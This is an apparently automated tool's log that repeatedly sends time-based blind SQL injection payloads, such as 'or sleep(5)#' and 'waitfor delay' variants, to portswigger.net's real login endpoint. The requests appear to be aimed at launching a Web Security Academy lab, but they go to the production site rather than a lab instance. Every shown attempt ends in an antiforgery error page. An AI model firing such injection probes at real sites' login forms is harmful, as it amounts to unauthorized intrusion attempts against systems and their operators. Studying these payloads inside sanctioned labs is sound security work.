+2024-08-16 22:02:27,356 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:28,343 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:28,393 - INFO - [22:02:28] Payload testing: 1 or sleep(5)#
+2024-08-16 22:02:28,406 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:30,130 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:30,727 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:30,743 - INFO - [22:02:30] Payload testing: 1 or sleep(5)#
+2024-08-16 22:02:30,752 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:32,686 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:33,305 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:33,327 - INFO - [22:02:33] Payload testing: 1 or sleep(5)#
+2024-08-16 22:02:33,335 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:35,232 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:35,869 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:35,892 - INFO - [22:02:35] Payload testing: " or sleep(5)#
+2024-08-16 22:02:35,903 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:37,626 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:38,200 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:38,221 - INFO - [22:02:38] Payload testing: " or sleep(5)#
+2024-08-16 22:02:38,230 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:40,122 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:40,464 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:40,749 - INFO - [22:02:40] Payload testing: " or sleep(5)#
+2024-08-16 22:02:40,757 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:42,351 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:42,916 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:42,947 - INFO - [22:02:42] Payload testing: ' or sleep(5)#
+2024-08-16 22:02:42,960 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:44,611 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:45,164 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:45,187 - INFO - [22:02:45] Payload testing: ' or sleep(5)#
+2024-08-16 22:02:45,199 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:47,506 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:47,853 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:48,156 - INFO - [22:02:48] Payload testing: ' or sleep(5)#
+2024-08-16 22:02:48,167 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:50,016 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:50,325 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:50,646 - INFO - [22:02:50] Payload testing: " or sleep(5)="
+2024-08-16 22:02:50,658 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:52,288 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:52,892 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:52,901 - INFO - [22:02:52] Payload testing: " or sleep(5)="
+2024-08-16 22:02:52,913 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:54,592 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:55,157 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:55,171 - INFO - [22:02:55] Payload testing: " or sleep(5)="
+2024-08-16 22:02:55,180 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:56,767 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:02:57,322 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:02:57,350 - INFO - [22:02:57] Payload testing: ' or sleep(5)='
+2024-08-16 22:02:57,359 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:02:58,946 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:00,037 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:00,045 - INFO - [22:03:00] Payload testing: ' or sleep(5)='
+2024-08-16 22:03:00,058 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:01,832 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:02,461 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:02,483 - INFO - [22:03:02] Payload testing: ' or sleep(5)='
+2024-08-16 22:03:02,491 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:04,132 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:04,459 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:04,727 - INFO - [22:03:04] Payload testing: 1) or sleep(5)#
+2024-08-16 22:03:04,736 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:06,399 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:06,962 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:06,984 - INFO - [22:03:06] Payload testing: 1) or sleep(5)#
+2024-08-16 22:03:06,991 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:08,684 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:09,242 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:09,273 - INFO - [22:03:09] Payload testing: 1) or sleep(5)#
+2024-08-16 22:03:09,286 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:11,116 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:11,781 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:12,062 - INFO - [22:03:11] Payload testing: ") or sleep(5)="
+2024-08-16 22:03:12,080 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:14,098 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:14,719 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:14,732 - INFO - [22:03:14] Payload testing: ") or sleep(5)="
+2024-08-16 22:03:14,741 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:16,648 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:17,256 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:17,277 - INFO - [22:03:17] Payload testing: ") or sleep(5)="
+2024-08-16 22:03:17,290 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:18,986 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:19,646 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:19,667 - INFO - [22:03:19] Payload testing: ') or sleep(5)='
+2024-08-16 22:03:19,676 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:21,388 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:22,000 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:22,012 - INFO - [22:03:22] Payload testing: ') or sleep(5)='
+2024-08-16 22:03:22,021 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:23,673 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:24,258 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:24,267 - INFO - [22:03:24] Payload testing: ') or sleep(5)='
+2024-08-16 22:03:24,279 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:26,043 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:26,439 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:26,684 - INFO - [22:03:26] Payload testing: 1)) or sleep(5)#
+2024-08-16 22:03:26,697 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:28,545 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:29,171 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:29,188 - INFO - [22:03:29] Payload testing: 1)) or sleep(5)#
+2024-08-16 22:03:29,199 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:30,963 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:31,586 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:31,597 - INFO - [22:03:31] Payload testing: 1)) or sleep(5)#
+2024-08-16 22:03:31,610 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:33,523 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:34,222 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:34,404 - INFO - [22:03:34] Payload testing: ")) or sleep(5)="
+2024-08-16 22:03:34,416 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:36,494 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:37,388 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:37,404 - INFO - [22:03:37] Payload testing: ")) or sleep(5)="
+2024-08-16 22:03:37,414 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:39,298 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:39,931 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:39,956 - INFO - [22:03:39] Payload testing: ")) or sleep(5)="
+2024-08-16 22:03:39,965 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:41,648 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:42,286 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:42,618 - INFO - [22:03:42] Payload testing: ')) or sleep(5)='
+2024-08-16 22:03:42,629 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:44,349 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:44,663 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:44,921 - INFO - [22:03:44] Payload testing: ')) or sleep(5)='
+2024-08-16 22:03:44,928 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:46,700 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:47,272 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:47,295 - INFO - [22:03:47] Payload testing: ')) or sleep(5)='
+2024-08-16 22:03:47,308 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:48,834 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:49,390 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:49,401 - INFO - [22:03:49] Payload testing: ;waitfor delay '0:0:5'--
+2024-08-16 22:03:49,412 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:51,165 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:51,766 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:51,789 - INFO - [22:03:51] Payload testing: ;waitfor delay '0:0:5'--
+2024-08-16 22:03:51,797 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:53,458 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:54,112 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:54,168 - INFO - [22:03:54] Payload testing: ;waitfor delay '0:0:5'--
+2024-08-16 22:03:54,177 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:55,884 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:56,538 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:56,551 - INFO - [22:03:56] Payload testing: );waitfor delay '0:0:5'--
+2024-08-16 22:03:56,563 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:03:58,269 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:03:58,906 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:03:58,918 - INFO - [22:03:58] Payload testing: );waitfor delay '0:0:5'--
+2024-08-16 22:03:58,926 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:00,731 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:01,012 - INFO - Error making request: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
+2024-08-16 22:04:01,018 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:02,697 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:03,318 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:03,326 - INFO - [22:04:03] Payload testing: ';waitfor delay '0:0:5'--
+2024-08-16 22:04:03,336 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:04,950 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:05,565 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:05,582 - INFO - [22:04:05] Payload testing: ';waitfor delay '0:0:5'--
+2024-08-16 22:04:05,593 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:07,132 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:07,700 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:07,720 - INFO - [22:04:07] Payload testing: ';waitfor delay '0:0:5'--
+2024-08-16 22:04:07,735 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:09,445 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:10,079 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:10,100 - INFO - [22:04:10] Payload testing: ";waitfor delay '0:0:5'--
+2024-08-16 22:04:10,109 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:11,664 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:12,209 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:12,229 - INFO - [22:04:12] Payload testing: ";waitfor delay '0:0:5'--
+2024-08-16 22:04:12,237 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:14,131 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:14,752 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:14,780 - INFO - [22:04:14] Payload testing: ";waitfor delay '0:0:5'--
+2024-08-16 22:04:14,789 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:16,410 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:16,731 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:17,010 - INFO - [22:04:17] Payload testing: ');waitfor delay '0:0:5'--
+2024-08-16 22:04:17,019 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:18,688 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:19,299 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:19,310 - INFO - [22:04:19] Payload testing: ');waitfor delay '0:0:5'--
+2024-08-16 22:04:19,320 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:20,940 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:21,515 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:21,527 - INFO - [22:04:21] Payload testing: ');waitfor delay '0:0:5'--
